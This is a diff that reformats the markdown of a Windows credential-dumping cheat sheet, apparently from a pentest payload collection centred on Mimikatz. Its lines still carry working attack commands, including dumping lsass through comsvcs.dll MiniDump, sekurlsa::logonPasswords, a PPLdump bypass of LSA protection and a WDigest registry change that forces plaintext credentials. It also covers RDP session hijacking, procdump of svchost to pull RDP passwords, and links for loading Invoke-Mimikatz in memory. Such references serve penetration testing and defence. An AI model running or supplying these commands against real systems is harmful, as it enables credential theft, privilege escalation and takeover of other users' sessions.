@@ -12,9 +12,9 @@
 * [RDP Session Takeover](#rdp-session-takeover)
 * [RDP Passwords](#rdp-passwords)
 * [Credential Manager & DPAPI](#credential-manager--dpapi)
-  * [Chrome Cookies & Credential](#chrome-cookies--credential)
-  * [Task Scheduled credentials](#task-scheduled-credentials)
-  * [Vault](#vault)
+    * [Chrome Cookies & Credential](#chrome-cookies--credential)
+    * [Task Scheduled credentials](#task-scheduled-credentials)
+    * [Vault](#vault)
 * [Commands list](#commands-list)
 * [Powershell version](#powershell-version)
 * [References](#references)
@@ -54,20 +54,21 @@ reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLo
 ```
 
 :warning: To take effect, conditions are required :
-- Win7 / 2008R2 / 8 / 2012 / 8.1 / 2012R2:
-  * Adding requires lock
-  * Removing requires signout
-- Win10:
-  * Adding requires signout
-  * Removing requires signout
-- Win2016:
-  * Adding requires lock
-  * Removing requires reboot
 
+* Win7 / 2008R2 / 8 / 2012 / 8.1 / 2012R2:
+    * Adding requires lock
+    * Removing requires signout
+* Win10:
+    * Adding requires signout
+    * Removing requires signout
+* Win2016:
+    * Adding requires lock
+    * Removing requires reboot
 
 ## LSA Protection Workaround
 
-- LSA as a Protected Process (RunAsPPL)
+* LSA as a Protected Process (RunAsPPL)
+
   ```powershell
   # Check if LSA runs as a protected process by looking if the variable "RunAsPPL" is set to 0x1
   reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa
@@ -97,7 +98,8 @@ reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLo
   PPLdump.exe -v 720 out.dmp
   ```
 
-- LSA is running as virtualized process (LSAISO) by **Credential Guard**
+* LSA is running as virtualized process (LSAISO) by **Credential Guard**
+
   ```powershell
   # Check if a process called lsaiso.exe exists on the running processes
   tasklist |findstr lsaiso
@@ -108,7 +110,6 @@ reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLo
 
   # Now every user session and authentication into this machine will get logged and plaintext credentials will get captured and dumped into c:\windows\system32\mimilsa.log
   ```
-
 
 ## Mini Dump
 
@@ -133,16 +134,16 @@ Dump the lsass process with `rundll32`
 rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsass_pid C:\temp\lsass.dmp full
 ```
 
-
 Use the minidump:
 
 * Mimikatz: `.\mimikatz.exe "sekurlsa::minidump lsass.dmp"`
+
   ```powershell
   mimikatz # sekurlsa::minidump lsass.dmp
   mimikatz # sekurlsa::logonPasswords
   ```
-* Pypykatz: `pypykatz lsa minidump lsass.dmp`
 
+* Pypykatz: `pypykatz lsa minidump lsass.dmp`
 
 ## Pass The Hash
 
@@ -176,15 +177,20 @@ rdesktop 10.0.0.2:3389 -u test -p mimikatz -d pentestlab
 Use `ts::multirdp` to patch the RDP service to allow more than two users.
 
 * Enable privileges
+
   ```powershell
   privilege::debug 
   token::elevate 
   ```
+
 * List RDP sessions
+
   ```powershell
   ts::sessions
   ```
+
 * Hijack session
+
   ```powershell
   ts::remote /id:2 
   ```
@@ -200,7 +206,7 @@ net start sesshijack
 
 ## RDP Passwords
 
-Verify if the service is running: 
+Verify if the service is running:
 
 ```ps1
 sc queryex termservice
@@ -209,23 +215,18 @@ netstat -nob | Select-String TermService -Context 1
 ```
 
 * Extract passwords manually
+
   ```ps1
   procdump64.exe -ma 988 -accepteula C:\svchost.dmp
   strings -el svchost* | grep Password123 -C3
   ```
+
 * Extract passwords using Mimikatz
+
   ```ps1
   privilege::debug
   ts::logonpasswords
   ```
-
-
-
-
-
-
-
-
 
 ## Credential Manager & DPAPI
 
@@ -299,22 +300,22 @@ vault::cred /in:C:\Users\demo\AppData\Local\Microsoft\Vault\"
 |SEKURLSA::Tickets | Lists all available Kerberos tickets for all recently authenticated users, including services running under the context of a user account and the local computer’s AD computer account. Unlike kerberos::list, sekurlsa uses memory reading and is not subject to key export restrictions. sekurlsa can access tickets of others sessions (users).|
 |TOKEN::List | list all tokens of the system|
 |TOKEN::Elevate | impersonate a token. Used to elevate permissions to SYSTEM (default) or find a domain admin token on the box|
-|TOKEN::Elevate /domainadmin | impersonate a token with Domain Admin credentials.
+|TOKEN::Elevate /domainadmin | impersonate a token with Domain Admin credentials.|
 
 ## Powershell version
 
 Mimikatz in memory (no binary on disk) with :
 
-- [Invoke-Mimikatz](https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1) from PowerShellEmpire
-- [Invoke-Mimikatz](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1) from PowerSploit
+* [Invoke-Mimikatz](https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1) from PowerShellEmpire
+* [Invoke-Mimikatz](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1) from PowerSploit
 
 More information can be grabbed from the Memory with :
 
-- [Invoke-Mimikittenz](https://raw.githubusercontent.com/putterpanda/mimikittenz/master/Invoke-mimikittenz.ps1)
+* [Invoke-Mimikittenz](https://raw.githubusercontent.com/putterpanda/mimikittenz/master/Invoke-mimikittenz.ps1)
 
 ## References
 
-- [Unofficial Guide to Mimikatz & Command Reference](https://adsecurity.org/?page_id=1821)
-- [Skeleton Key](https://pentestlab.blog/2018/04/10/skeleton-key/)
-- [Reversing Wdigest configuration in Windows Server 2012 R2 and Windows Server 2016 - 5TH DECEMBER 2017 - ACOUCH](https://www.adamcouch.co.uk/reversing-wdigest-configuration-in-windows-server-2012-r2-and-windows-server-2016/)
-- [Dumping RDP Credentials - MAY 24, 2021](https://pentestlab.blog/2021/05/24/dumping-rdp-credentials/)
+* [Unofficial Guide to Mimikatz & Command Reference](https://adsecurity.org/?page_id=1821)
+* [Skeleton Key](https://pentestlab.blog/2018/04/10/skeleton-key/)
+* [Reversing Wdigest configuration in Windows Server 2012 R2 and Windows Server 2016 - 5TH DECEMBER 2017 - ACOUCH](https://www.adamcouch.co.uk/reversing-wdigest-configuration-in-windows-server-2012-r2-and-windows-server-2016/)
+* [Dumping RDP Credentials - MAY 24, 2021](https://pentestlab.blog/2021/05/24/dumping-rdp-credentials/)
